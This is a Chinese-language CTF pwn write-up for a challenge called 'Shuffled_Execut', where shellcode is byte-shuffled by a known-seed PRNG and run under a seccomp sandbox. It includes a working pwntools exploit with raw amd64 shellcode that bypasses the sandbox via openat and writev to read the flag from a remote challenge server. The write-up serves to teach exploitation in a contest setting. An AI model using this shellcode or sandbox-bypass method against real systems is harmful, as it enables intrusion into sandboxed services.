# Shuffled_Execut

> 分类：Pwn

## 题目描述

shellcode 编码题。程序申请一段 rwx 空间，读入用户 shellcode，通过 shuffle() 函数用伪随机数随机交换两个字节完成编码。当输入长度小于 0xaf 时执行沙箱并执行 shellcode。

## 考察知识点

- shellcode 编码/解码（shuffle 伪随机交换）
- seccomp 沙箱绕过
- openat + writev 读文件

## 解法

1. shellcode 编码函数 shuffle() 使用伪随机数随机交换两个字节，由于随机数种子已知，当 shellcode 长度固定时，可按 shuffle 逆运算处理，使编码后的 shellcode 正常执行。
2. 用 seccomp-tools 提取沙箱规则，发现禁用了 orw 和 execve 等大量 syscall，因此用 openat + writev 输出 flag。
3. 写好 shellcode 后按 shuffle() 逻辑逆运算处理，exp：

```python
from pwn import *

p = remote('8.147.128.54', 18974)
context.arch = 'amd64'

payload = b'\x00\x00' + b'\x48\x89\xc4\x48\x81\xc4\x00\x01\x00\x00\x68\x66\x6c\x61\x67\x54\x5e\x48\x31\xff\x48\x83\xef\x64\x48\x31\xd2\x4d\x31\xd2\x48\xc7\xc0\x01\x01\x00\x00\x0f\x05\x48\xc7\xc7\x00\x00\x01\x00\x48\xc7\xc6\x00\x10\x00\x00\x48\xc7\xc2\x07\x00\x00\x00\x6a\x12\x41\x5a\x6a\x03\x41\x58\x4d\x31\xc9\x6a\x09\x58\x0f\x05\x6a\x01\x5f\x6a\x01\x5a\x68\x00\x01\x00\x00\x50\x48\x89\xe6\x6a\x14\x58\x0f\x05'

p.sendline(payload)
p.interactive()
```

（用 openat 打开 flag，writev 输出）

## 参考答案

（flag 通过 openat+writev shellcode 读取）

## 来源

- 作者：花草木_逆向小白 | https://blog.csdn.net/qq_67760645/article/details/140244620
